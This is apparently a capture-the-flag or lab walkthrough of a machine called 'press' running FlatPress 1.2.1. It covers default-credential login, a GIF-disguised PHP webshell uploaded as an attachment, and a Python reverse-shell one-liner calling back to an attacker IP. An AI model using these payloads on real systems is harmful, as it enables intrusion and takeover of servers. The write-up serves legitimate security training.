# press

I start by a quick nmap to look for open ports:

<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

On the first webpage:

<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

On the second web page:

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

so i clicked on the login page and managed to connect through default creds admin:password

Then i found this exploit since the nmap scan revealed `FlatPress fp-1.2.1`

{% embed url="https://github.com/flatpressblog/flatpress/issues/152" %}

```
GIF89a;
<?php
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

nice we got our webshell so i can try to get a reverse shell ->

```
http://192.168.54.29:8089/fp-content/attachs/shell.php?c=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22192.168.49.54%22,1234));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22sh%22)%27
```

Once i get my reverse shell i enumerate for sudo rights:

<figure><img src="../../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

and just like that i'm able to root the machine and elevate my privileges:

<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>
